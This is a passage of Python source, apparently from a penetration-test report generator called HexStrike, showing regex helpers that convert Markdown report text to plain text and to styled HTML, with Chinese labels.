        txt = re.sub(r'```[\s\S]*?```', lambda m: m.group(0).replace('```', '').strip(), txt)
        txt = re.sub(r'\|[-:| ]+\|', '', txt, flags=re.MULTILINE)
        txt = re.sub(r'^\|', '  ', txt, flags=re.MULTILINE)
        txt = re.sub(r'\|', ' | ', txt)
        txt = re.sub(r'^---$', '─' * 60, txt, flags=re.MULTILINE)
        return txt

    def _md_to_html(self, md: str) -> str:
        """Markdown → HTML"""
        import re
        html = md
        for i in range(6, 0, -1):
            pattern = re.compile(r'^#{' + str(i) + r'}\s+(.+)$', re.MULTILINE)
            html = pattern.sub(f'<h{i}>\\1</h{i}>', html)
        html = re.sub(r'\*\*(.+?)\*\*', r'<strong>\1</strong>', html)
        html = re.sub(r'`(.+?)`', r'<code>\1</code>', html)
        html = re.sub(r'```(\w*)\n([\s\S]*?)```', r'<pre><code>\2</code></pre>', html)
        html = html.replace('\n', '<br>\n')
        html = re.sub(r'^\|(.+)\|$', lambda m: '<tr>' + ''.join(f'<td>{c.strip()}</td>' for c in m.group(1).split('|')) + '</tr>', html, flags=re.MULTILINE)
        html = re.sub(r'(<tr>.*?</tr>(<br>)?)+', lambda m: '<table>' + m.group(0).replace('<br>', '') + '</table>', html)
        html = re.sub(r'^- (.+)$', r'<li>\1</li>', html, flags=re.MULTILINE)
        html = re.sub(r'(<li>.*?</li>(<br>)?)+', lambda m: '<ul>' + m.group(0).replace('<br>', '') + '</ul>', html)

        return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>HexStrike 渗透测试报告</title>
<style>
body {{ font-family: 'Microsoft YaHei','Segoe UI',sans-serif; max-width: 900px; margin: 30px auto; padding: 20px; color: #333; line-height: 1.8; }}
h1 {{ color: #c00; border-bottom: 2px solid #c00; padding-bottom: 8px; }}
h2 {{ color: #333; border-bottom: 1px solid #999; padding-bottom: 5px; margin-top: 30px; }}
h3 {{ color: #555; margin-top: 20px; }}
h4 {{ color: #777; }}
table {{ border-collapse: collapse; width: 100%; margin: 10px 0; }}
td, th {{ border: 1px solid #ddd; padding: 6px 10px; text-align: left; }}
code {{ background: #f5f5f5; padding: 2px 5px; border-radius: 3px; font-size: 13px; }}
pre {{ background: #1e1e1e; color: #d4d4d4; padding: 15px; border-radius: 5px; overflow-x: auto; }}
pre code {{ background: none; color: inherit; }}
li {{ margin: 3px 0; }}
</style></head><body>{html}</body></html>"""


if __name__ == "__main__":
    print("报告生成Agent模块已加载（含SmartAgent升级版 + 深度数据提取 + 简/详报 + MD/TXT/PDF）")